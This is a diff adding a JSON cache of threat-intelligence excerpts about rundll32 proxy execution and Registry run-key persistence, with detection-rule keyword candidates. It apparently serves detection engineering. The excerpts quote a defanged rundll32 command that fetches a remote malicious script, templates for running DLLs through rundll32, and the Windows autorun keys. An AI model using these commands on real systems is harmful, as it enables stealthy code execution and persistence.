@@ -1,0 +1,199 @@
+{
+  "timestamp": 1779000551,
+  "fetched": 5,
+  "failed": 0,
+  "errors": [],
+  "chunks": [
+    {
+      "chunk_id": "online-mitre_t1218_011",
+      "title": "MITRE ATT&CK T1218.011 Rundll32",
+      "text": "Source: https://attack.mitre.org/techniques/T1218/011/\nSystem Binary Proxy Execution: Rundll32, Sub-technique T1218.011 - Enterprise | MITRE ATT&CK® Matrices Enterprise Mobile ICS Tactics Enterprise Mobile ICS Techniques Enterprise Mobile ICS Defenses Mitigations Enterprise Mobile ICS Assets Detections Detection Strategies Analytics Data Components CTI Groups Software Campaigns Resources Get Started Learn More about ATT&CK ATT&CK Advisory Council ATT&CKcon ATT&CK Data & Tools FAQ Engage with ATT&CK Version History Updates Legal & Branding Benefactors Contribute Blog Search ATT&CK v19 has been released! Check out the blog post for more information. Home Techniques Enterprise System Binary Proxy Execution Rundll32 System Binary Proxy Execution: Rundll32 Other sub-techniques of System Binary Proxy Execution (14) ID Name T1218.001 Compiled HTML File T1218.002 Control Panel T1218.003 CMSTP T1218.004 InstallUtil T1218.005 Mshta T1218.007 Msiexec T1218.008 Odbcconf T1218.009 Regsvcs/Regasm T1218.010 Regsvr32 T1218.011 Rundll32 T1218.012 Verclsid T1218.013 Mavinject T1218.014 MMC T1218.015 Electron Applications Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e. Shared Modules ), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads (ex: rundll32.exe {DLLname, DLLfunction} ). Rundll32.exe can also be used to execute Control Panel Item files (.cpl) through the undocumented shell32.dll functions Control_RunDLL and Control_RunDLLAsUser . Double-clicking a .cpl file also causes rundll32.exe to execute. [1] For example, ClickOnce can be proxied through Rundll32.exe. Rundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this: rundll32.exe javascript:\"..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https[:]//www[.]example[.]com/malicious.sct\")\" This behavior has been seen used by malware such as Poweliks. [2] Threat actors may also abuse legitimate, signed system DLLs (e.g., zipfldr.dll, ieframe.dll ) with rundll32.exe to e",
+      "tags": [
+        "mitre",
+        "t1218.011",
+        "rundll32",
+        "online"
+      ],
+      "rule_candidates": [
+        {
+          "kind": "suspicious_string",
+          "value": "rundll32.exe"
+        },
+        {
+          "kind": "critical_group",
+          "values": [
+            "startup",
+            "rundll32.exe"
+          ]
+        },
+        {
+          "kind": "suspicious_string",
+          "value": "CSIDL_STARTUP"
+        },
+        {
+          "kind": "suspicious_string",
+          "value": "RunHTMLApplication"
+        },
+        {
+          "kind": "critical_group",
+          "values": [
+            "rundll32.exe",
+            "mshtml",
+            "runhtmlapplication"
+          ]
+        },
+        {
+          "kind": "critical_group",
+          "values": [
+            "registry run keys",
+            "startup folder"
+          ]
+        },
+        {
+          "kind": "suspicious_string",
+          "value": "shell32.dll"
+        }
+      ]
+    },
+    {
+      "chunk_id": "online-mitre_t1547_001",
+      "title": "MITRE ATT&CK T1547.001 Registry Run Keys Startup Folder",
+      "text": "Source: https://attack.mitre.org/techniques/T1547/001/\nBoot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Sub-technique T1547.001 - Enterprise | MITRE ATT&CK® Matrices Enterprise Mobile ICS Tactics Enterprise Mobile ICS Techniques Enterprise Mobile ICS Defenses Mitigations Enterprise Mobile ICS Assets Detections Detection Strategies Analytics Data Components CTI Groups Software Campaigns Resources Get Started Learn More about ATT&CK ATT&CK Advisory Council ATT&CKcon ATT&CK Data & Tools FAQ Engage with ATT&CK Version History Updates Legal & Branding Benefactors Contribute Blog Search ATT&CK v19 has been released! Check out the blog post for more information. Home Techniques Enterprise Boot or Logon Autostart Execution Registry Run Keys / Startup Folder Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder Other sub-techniques of Boot or Logon Autostart Execution (14) ID Name T1547.001 Registry Run Keys / Startup Folder T1547.002 Authentication Package T1547.003 Time Providers T1547.004 Winlogon Helper DLL T1547.005 Security Support Provider T1547.006 Kernel Modules and Extensions T1547.007 Re-opened Applications T1547.008 LSASS Driver T1547.009 Shortcut Modification T1547.010 Port Monitors T1547.012 Print Processors T1547.013 XDG Autostart Entries T1547.014 Active Setup T1547.015 Login Items Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the \"run keys\" in the Registry or startup folder will cause the program referenced to be executed when a user logs in. [1] These programs will be executed under the context of the user and will have the account's associated permissions level. The following run keys are created by default on Windows systems: HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce Run keys may exist under multiple hives. [2] [3] The HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx is also available but is not created by default on Windows Vista and n",
+      "tags": [
+        "mitre",
+        "t1547.001",
+        "startup",
+        "registry",
+        "online"
+      ],
+      "rule_candidates": [
+        {
+          "kind": "suspicious_string",
+          "value": "rundll32.exe"
+        },
+        {
+          "kind": "critical_group",
+          "values": [
+            "startup",
+            "rundll32.exe"
+          ]
+        },
+        {
+          "kind": "suspicious_string",
+          "value": "CSIDL_STARTUP"
+        },
+        {
+          "kind": "critical_group",
+          "values": [
+            "registry run keys",
+            "startup folder"
+          ]
+        }
+      ]
+    },
+    {
+      "chunk_id": "online-lolbas_rundll32",
+      "title": "LOLBAS Rundll32",
+      "text": "Source: https://lolbas-project.github.io/lolbas/Binaries/Rundll32/\nRundll32 | LOLBAS .. /Rundll32.exe Star Execute (DLL, Remote, JScript, COM) Alternate data streams (DLL) Used by Windows to execute dll files Paths: C:\\Windows\\System32\\rundll32.exe C:\\Windows\\SysWOW64\\rundll32.exe Resources: https://pentestlab.blog/2017/05/23/applocker-bypass-rundll32/ https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_7 https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/ https://oddvar.moe/2018/01/14/putting-data-in-alternate-data-streams-and-how-to-execute-it/ https://bohops.com/2018/06/28/abusing-com-registry-structure-clsid-localserver32-inprocserver32/ https://github.com/sailay1996/expl-bin/blob/master/obfus.md https://github.com/sailay1996/misc-bin/blob/master/rundll32.md https://nasbench.medium.com/a-deep-dive-into-rundll32-exe-642344b41e90 https://www.cybereason.com/blog/rundll32-the-infamous-proxy-for-executing-malicious-code Acknowledgements: Casey Smith ( @subtee ) Oddvar Moe ( @oddvarmoe ) Jimmy ( @bohops ) Sailay ( @404death ) Martin Ingesen ( @Mrtn9 ) Detections: Sigma: https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/network_connection/net_connection_win_rundll32_net_connections.yml Sigma: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_rundll32_susp_activity.yml Elastic: https://github.com/elastic/detection-rules/blob/12577f7380f324fcee06dab3218582f4a11833e7/rules/windows/defense_evasion_unusual_network_connection_via_rundll32.toml IOC: Outbount Internet/network connections made from rundll32 IOC: Suspicious use of cmdline flags such as -sta Execute First part should be a DLL file (any extension accepted), EntryPoint should be the name of the entry point in the DLL file to execute. rundll32.exe {PATH},EntryPoint Use case Execute DLL file Privileges required User Operating systems Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11 ATT&CK® technique T1218.011 Tags Execute: DLL Execute a DLL from an SMB share. EntryPoint is the name of the entry point in the DLL file to execute. rundll32.exe {PATH_SMB:.dll},EntryPoint Use case Execute D",
+      "tags": [
+        "lolbas",
+        "rundll32",
+        "lolbin",
+        "online"
+      ],
+      "rule_candidates": [
+        {
+          "kind": "suspicious_string",
+          "value": "rundll32.exe"
+        },
+        {
+          "kind": "suspicious_string",
+          "value": "RunHTMLApplication"
+        },
+        {
+          "kind": "critical_group",
+          "values": [
+            "rundll32.exe",
+            "mshtml",
+            "runhtmlapplication"
+          ]
+        }
+      ]
+    },
+    {
+      "chunk_id": "online-microsoft_goldmax",
+      "title": "Microsoft Security Blog GoldMax layered persistence",
+      "text": "Source: https://www.microsoft.com/en-us/security/blog/?p=93028\nGoldMax, GoldFinder, and Sibot: Analyzing NOBELIUM’s layered persistence | Microsoft Security Blog Skip to content Skip to main content Security Microsoft Defender Microsoft Entra Microsoft Intune Microsoft Purview Microsoft Security Copilot Microsoft Sentinel View all products AI-powered cybersecurity Cloud security Data security & governance Identity & network access Privacy & risk management Security for AI Small and medium business Unified SecOps Zero Trust Pricing Services Partners Why Microsoft Security Cybersecurity awareness Customer stories Security 101 Product trials How we protect Microsoft Industry recognition Microsoft Security Insider Microsoft Digital Defense Report Security Response Center Microsoft Security Blog Microsoft Security Events Microsoft Tech Community Documentation Technical Content Library Training & certifications Compliance Program for Microsoft Cloud Microsoft Trust Center Security Engineering Portal Service Trust Portal Microsoft Secure Future Initiative Business Solutions Hub Contact Sales Start free trial Microsoft Security Azure Dynamics 365 Microsoft 365 Microsoft Teams Windows 365 Microsoft AI Azure Space Mixed reality Microsoft HoloLens Microsoft Viva Quantum computing Sustainability Education Automotive Financial services Government Healthcare Manufacturing Retail Find a partner Become a partner Partner Network Microsoft Marketplace Software companies Blog Microsoft Advertising Developer Center Documentation Events Licensing Microsoft Learn Microsoft Research View Sitemap Home GoldMax, GoldFinder, and Sibot: Analyzing NOBELIUM’s layered persistence Search Research March 4, 2021 22 min read GoldMax, GoldFinder, and Sibot: Analyzing NOBELIUM’s layered persistence By Ramin Nafisi , Andrea Lelli and Microsoft Threat Intelligence Share Link copied to clipboard! Tags Midnight Blizzard (NOBELIUM) Content types Research Topics Threat intelligence April 2023 update – Microsoft Threat Intelligence has shifted to a new threat actor naming taxonomy aligned around the theme of weather. NOBELIUM is now tracked as Midnight Blizzard . April 15, 2021 update – We updated this blog with new indicators of compromise, including files , domains",
+      "tags": [
+        "microsoft",
+        "security-blog",
+        "persistence",
+        "rundll32",
+        "online"
+      ],
+      "rule_candidates": [
+        {
+          "kind": "suspicious_string",
+          "value": "rundll32.exe"
+        },
+        {
+          "kind": "suspicious_string",
+          "value": "vbscript"
+        },
+        {
+          "kind": "suspicious_string",
+          "value": "WScript.Shell"
+        },
+        {
+          "kind": "suspicious_string",
+          "value": "wscript.exe"
+        },
+        {
+          "kind": "suspicious_string",
+          "value": "RunHTMLApplication"
+        },
+        {
+          "kind": "critical_group",
+          "values": [
+            "rundll32.exe",
+            "mshtml",
+            "runhtmlapplication"
+          ]
+        }
+      ]
+    },
+    {
+      "chunk_id": "online-cisa_t1218_011",
+      "title": "CISA Eviction Strategies T1218.011",
+      "text": "Source: https://www.cisa.gov/eviction-strategies-tool/info-attack/T1218.011\n| CISA Skip to main content An official website of the United States government Here’s how you know Here’s how you know Official websites use .gov A .gov website belongs to an official government organization in the United States. Secure .gov websites use HTTPS A lock ( Lock A locked padlock ) or https:// means you’ve safely connected to the .gov website. Share sensitive information only on official, secure websites. no-cost Cyber Services Secure by design Secure Your Business Shields Up Report A Cyber Issue Search Menu Close Topics Topics Cybersecurity Best Practices Cyber Threats and Response Critical Infrastructure Security and Resilience Election Security Emergency Communications Industrial Control Systems Information and Communications Technology Supply Chain Security Partnerships and Collaboration Physical Security Risk Management How can we help? Government Educational Institutions Industry State, Local, Tribal, and Territorial Individuals and Families Small and Medium Businesses Find Help Locally Faith-Based Community Executives High-Risk Communities Spotlight Resources & Tools Resources & Tools All Resources & Tools Services Programs Resources Training Groups News & Events News & Events Directives News Events Cybersecurity Alerts & Advisories Request a CISA Speaker Congressional Testimony CISA Conferences CISA Live! Careers Careers Benefits & Perks Hiring and Recruitment New Employee Orientation & Onboarding Students & Recent Graduates Veteran and Military Spouses About About Divisions & Offices Regions Leadership Doing Business with CISA Site Links CISA GitHub CISA Central Contact Us Subscribe Transparency and Accountability Policies & Plans no-cost Cyber Services Secure by design Secure Your Business Shields Up Report A Cyber Issue Breadcrumb Home Eviction Strategies Tool Info Attack Share: Rundll32 (T1218.011) Rundll32 (T1218.011) View on ATT&CK Add to Playbook In Playbook Description Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e. [Shared Modules](https://attack.mitre.org/techniques/T1129)), may avoid triggering security tools that may not monitor execution of the rundll32.ex",
+      "tags": [
+        "cisa",
+        "t1218.011",
+        "rundll32",
+        "online"
+      ],
+      "rule_candidates": [
+        {
+          "kind": "suspicious_string",
+          "value": "rundll32.exe"
+        },
+        {
+          "kind": "suspicious_string",
+          "value": "RunHTMLApplication"
+        },
+        {
+          "kind": "critical_group",
+          "values": [
+            "rundll32.exe",
+            "mshtml",
+            "runhtmlapplication"
+          ]
+        },
+        {
+          "kind": "suspicious_string",
+          "value": "shell32.dll"
+        }
+      ]
+    }
+  ]
+}
